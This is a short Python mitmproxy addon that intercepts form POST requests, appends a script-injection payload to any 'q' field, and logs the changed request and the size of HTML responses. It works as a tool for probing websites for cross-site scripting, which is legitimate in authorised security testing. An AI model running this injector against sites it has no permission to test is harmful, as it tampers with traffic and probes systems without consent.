from mitmproxy import http

class Injector:
    def request(self, flow: http.HTTPFlow) -> None:
        if flow.request.method == "POST" \
           and "application/x-www-form-urlencoded" in flow.request.headers.get("Content-Type", ""):
            form = flow.request.urlencoded_form
            if "q" in form:
                form["q"] += "'; alert('VULN'); //"
                flow.request.urlencoded_form = form
                print(f"[inject] {flow.request.pretty_url} q -> {form['q']}")

    def response(self, flow: http.HTTPFlow) -> None:
        ct = flow.response.headers.get("Content-Type", "")
        if "text/html" in ct:
            print(f"[resp] {flow.request.pretty_url}  â†’ {len(flow.response.content)} bytes")

addons = [ Injector() ]